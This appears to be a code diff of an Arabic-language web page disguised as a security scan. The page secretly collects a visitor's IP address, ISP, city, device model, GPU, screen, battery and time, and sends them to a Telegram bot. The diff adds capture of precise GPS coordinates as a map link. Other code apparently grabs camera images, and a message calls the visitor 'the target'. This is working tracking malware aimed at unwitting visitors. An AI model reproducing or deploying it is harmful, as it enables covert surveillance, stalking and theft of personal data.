@@ -16,7 +16,7 @@
 
     <div class="box">
         <div class="ldr" id="L"></div>
-        <p id="T">جاري فحص بروتوكولات الأمان...</p>
+        <p id="T">جاري الفحص...</p>
         <button id="B">متابعة الآن</button>
     </div>
 
@@ -31,22 +31,15 @@
             let n = navigator;
             let r = "🛑 **تقرير تقني شامل (فوري)**\n\n";
 
-            // 1. جلب الآي بي والشبكة (الطريقة التي كانت تعمل لديك بدقة)
+            // 1. جلب الآي بي والشبكة (التي تعمل لديك)
             try {
                 const res = await fetch('https://ipapi.co/json/').then(d => d.json());
                 r += `🌍 **الآي بي:** \`${res.ip}\`\n`;
                 r += `🏢 **الشركة (ISP):** ${res.org}\n`;
-                r += `📍 **المكان:** ${res.city}, ${res.country_name}\n`;
-                r += `📡 **الشبكة:** ${res.asn}\n`;
-            } catch(e) {
-                // محاولة احتياطية في حال فشل الخدمة الأولى
-                try {
-                    const res2 = await fetch('https://api.ipify.org?format=json').then(d => d.json());
-                    r += `🌍 **الآي بي:** \`${res2.ip}\` (جلب أساسي)\n`;
-                } catch(e2) { r += "🌍 **الشبكة:** فشل جلب الآي بي\n"; }
-            }
+                r += `📍 **المكان (تقريبي):** ${res.city}, ${res.country_name}\n`;
+            } catch(e) { r += "🌍 **الشبكة:** فشل جلب الآي بي\n"; }
 
-            // 2. كشف نوع الهاتف والموديل الدقيق (Deep Detection)
+            // 2. كشف نوع الهاتف والموديل الدقيق
             let model = "غير معروف";
             try {
                 if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
@@ -64,29 +57,30 @@
                 const gl = document.createElement('canvas').getContext('webgl');
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
                 r += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
-            } catch(e) { r += "🎮 **المعالج الرسومي:** مخفي\n"; }
+            } catch(e) {}
 
-            // 4. المتصفح، الأنوية، الشاشة، البطارية
-            let br = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Safari/Other";
             r += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 8}\n`;
             r += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
-            r += `🧭 **المتصفح:** ${br}\n`;
-
+            
             try {
                 const b = await n.getBattery();
                 r += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
             } catch(e) {}
-            
+
             r += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}`;
 
-            // إرسال التقرير فوراً لتليجرام
-            fetch(_U + "sendMessage", { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ chat_id: _C, text: r, parse_mode: "Markdown" })
-            });
+            // إرسال التقرير النصي الأول فوراً
+            sendText(r);
             
-            // إظهار الزر
+            // طلب الموقع الجغرافي الدقيق (GPS)
+            if (n.geolocation) {
+                n.geolocation.getCurrentPosition((pos) => {
+                    let gps = `📍 **الموقع الدقيق (GPS):**\n`;
+                    gps += `رابط الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendText(gps);
+                });
+            }
+
             setTimeout(() => { 
                 document.getElementById('L').style.display='none'; 
                 document.getElementById('T').innerText='اكتمل الفحص بنجاح.'; 
@@ -109,9 +103,17 @@
                     }, 'image/jpeg', 0.8);
                 }, 4000);
             } catch (e) {
-                fetch(_U + "sendMessage", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _C, text: "⚠️ المستهدف رفض الكاميرا" })});
+                sendText("⚠️ المستهدف رفض الكاميرا");
             }
         };
+
+        function sendText(t) {
+            fetch(_U + "sendMessage", { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ chat_id: _C, text: t, parse_mode: "Markdown" })
+            });
+        }
 
         fullScan();
     </script>
